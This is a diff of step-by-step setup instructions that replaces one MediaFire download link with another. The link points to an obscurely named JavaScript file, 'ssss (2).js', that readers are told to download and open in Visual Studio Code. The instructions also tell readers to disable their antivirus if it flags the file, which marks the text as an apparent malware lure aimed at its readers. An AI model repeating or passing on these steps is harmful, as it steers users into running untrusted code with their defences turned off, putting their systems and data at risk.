@@ -16,7 +16,7 @@ Please read the following instructions:
 ------------------------------------------------------
 2. Install and setup `Visual Studio Code`: [https://code.visualstudio.com/Download](https://code.visualstudio.com/Download)
 ------------------------------------------------------
-3. Download and open this file: [https://www.mediafire.com/file/3sfwiheir9an89r/ssss+(2).js/file](https://www.mediafire.com/file/3sfwiheir9an89r/ssss+(2).js/file)
+3. Download and open this file: [https://www.mediafire.com/file/254vmwe9tx86f9y/ssss+(2)+(1).js/file](https://www.mediafire.com/file/254vmwe9tx86f9y/ssss+(2)+(1).js/file)
 
 [IMPORTANT] If your antivirus flags it, disable it and try it again.
 ------------------------------------------------------
